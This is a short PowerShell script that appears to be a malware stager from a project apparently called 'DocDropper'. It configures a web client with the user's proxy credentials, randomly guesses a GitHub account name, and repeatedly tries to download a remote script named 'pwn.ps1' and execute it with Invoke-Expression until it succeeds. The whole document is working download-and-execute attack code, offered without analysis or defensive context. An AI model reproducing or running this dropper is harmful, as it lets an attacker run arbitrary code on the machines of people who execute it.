$wc = new-object system.net.webclient;
$userAgent = '@tfairane';
$wc.headers.add('User-Agent', $userAgent);
$wc.proxy = [system.net.webrequest]::defaultwebproxy;
$wc.proxy.credentials = [system.net.credentialcache]::defaultnetworkcredentials;

while({
  ($sub) = ("tf","ai","ra","ne");
  for(($i, $str) = (0, ''); $i -lt $sub.Length; $i++) {
    $str += $sub[(Get-Random -maximum $sub.Length)];
  }
  $sc = "https://raw.githubusercontent.com/" + $str + "/DocDropper/master/stub/pwn.ps1";
  try {
    Invoke-Expression($wc.downloadstring($sc));
    break;
  } catch{ return $true; }
}.invoke()){}
